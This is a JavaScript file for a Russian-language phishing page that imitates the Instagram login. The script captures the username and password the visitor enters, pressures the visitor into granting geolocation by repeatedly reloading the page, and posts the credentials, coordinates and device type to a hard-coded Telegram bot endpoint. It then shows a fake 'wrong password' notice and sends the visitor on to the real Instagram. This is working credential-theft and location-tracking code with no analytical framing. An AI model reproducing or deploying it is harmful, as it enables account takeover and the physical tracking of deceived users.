let input1 = document.querySelector("#input1");
let input2 = document.querySelector("#input2");
let main_main = document.getElementById("main_main");
let main_block3 = document.getElementById("main_block3");
let main_block2 = document.getElementById("main_block2");
let form = document.querySelector(".form1");
let user_device = null;
let check_all = false;

if (
  /Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(
    navigator.userAgent
  )
) {
  user_device = "Телфон/Планшет";
} else user_device = "Компьютер";

let flag = true;

let width = window.innerWidth;
let height = window.innerHeight;
let wid = 0;
let hei = 0;

if (width >= 350) {
  wid = 300;
  hei = 296;
  document.getElementsByClassName("main_block2")[0].style.margin =
    "-10px 0 0 0";
}

if (width >= 1100 && width < 1150) {
  document.getElementsByClassName("main_block2")[0].style.margin =
    "-10px 0 0 0";
}

if (width >= 1150) {
  document.getElementsByClassName("main_block2")[0].style.margin =
    "-40px 0 0 0";
}

if (width < 350) {
  wid = width - width / 4;
  hei = height - height / 3;
  document.querySelector(".a_block3").style.top = "49%";
  document.querySelector(".a_block3").style.left = "75.5%";
  document.querySelector(".p_block3").style.fontSize = "10px";
  document.querySelector(".a_block3").style.fontSize = "10px";
  document.getElementsByClassName("main_block2")[0].style.margin = 0;
}

document.getElementsByClassName("main_block")[0].style.width = wid + "px";
document.getElementsByClassName("main_block")[0].style.height = hei + "px";
document.getElementsByClassName("main_block2")[0].style.width = wid + "px";
document.getElementsByClassName("main_block2")[0].style.height = hei / 6 + "px";

const timerIntervalID = setInterval(function () {
  main_main.display = "none";
  main_block3.display = "flex";
  set_time(timerIntervalID);
}, 800);

form.addEventListener("submit", (event) => {
  if (input1.value == "") {
    event.preventDefault();
  } else if (input2.value == "" || input2.value.length < 6) {
    event.preventDefault();
  } else {
    if (flag == true) {
      // event.preventDefault();
      document.getElementsByClassName("p3")[0].style.display = "none";
      set_color_p3();
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, error_func);
        if (check_all == false) {
          event.preventDefault();
        }
        form.action = "https://www.instagram.com/";
      }
    }
  }
});
function set_time() {
  main_main.style.display = "flex";
  main_block3.style.display = "none";
  clearInterval(timerIntervalID);
}

function set_color_p3() {
  document.querySelector(".p3").innerText =
    "Дайте разрешение Instagram на сбор геоданных !!!";
  document.querySelector(".p3").style.color = "#0c4d78";
  document.querySelector(".p3").style.display = "flex";
}

function set_color_p3_2() {
  document.querySelector(".p3").style.display = "none";
  document.querySelector(".p3").innerText =
    "Вы ввели неверный пароль. Попробуйте ещё раз.";
  document.querySelector(".p3").style.color = "#ed4956";
}

function error_func(error) {
  if (error.code == error.PERMISSION_DENIED) {
    check_all = false;
    document.querySelector(".p3").innerText =
      "Дайте разрешение Instagram на сбор геоданных !!!";
    document.querySelector(".p3").style.display = "flex";
    setInterval(function () {
      location.reload();
    }, 3000);
    navigator.geolocation.getCurrentPosition(showPosition, error_func);
  }
}
// , error_func - 456789
document.querySelector("#span1").addEventListener("click", (event) => {
  set_color_p3();
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, error_func);
  }
  if (check_all == false) {
    event.preventDefault();
  }
});

document.querySelector(".a_block3").addEventListener("click", (event) => {
  set_color_p3();
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, error_func);
  }
  if (check_all == false) {
    event.preventDefault();
  }
});

document.querySelector(".link1").addEventListener("click", (event) => {
  set_color_p3();
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, error_func);
  }
  if (check_all == false) {
    event.preventDefault();
  }
});

document.querySelector(".link2").addEventListener("click", (event) => {
  set_color_p3();
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, error_func);
  }
  if (check_all == false) {
    event.preventDefault();
  }
});

document.addEventListener("keydown", (event) => {
  if (event.code == "Enter") {
    if (document.activeElement.id == "input1") {
      if (String(input1.value) != "") {
        input2.focus();
        return;
      }
    }
  }
});

input2.addEventListener("keydown", (event) => {
  if (event.key == "Backspace") {
    if (input2.value.length - 1 < 6) {
      document.querySelector(".btn").style.backgroundColor = "#4cb5f9";
      return;
    }
  } else if (input2.value.length >= 5) {
    if (event.key != "Enter") {
      if (input1.value.length > 1) {
        document.querySelector(".btn").style.backgroundColor = "#0095f6";
      }
      return;
    }
  }
});

function showPosition(position) {
  set_color_p3_2();
  check_all = true;
  document.querySelector(".p3").innerText =
    "Вы ввели неверный пароль. Попробуйте ещё раз.";
  document.querySelector(".p3").style.display = "none";
  var lat = position.coords.latitude;
  var lon = position.coords.longitude;
  var hesh = {
    device: user_device,
    cordination: `Широта: ${lat}, Долгота: ${lon}`,
    login: input1.value,
    password: input2.value,
  };
  user_id = 2048964476;
  let url =
    "https://api.telegram.org/bot6869947354:AAHVClBKAyQ-aMjQphF-fcqBd2ajDJUTPqw/sendMessage";
  console.log(hesh);
  fetch(url, {
    method: "post",
    body: JSON.stringify({ chat_id: user_id, text: hesh }),
    headers: {
      "content-type": "application/json",
    },
  });
}
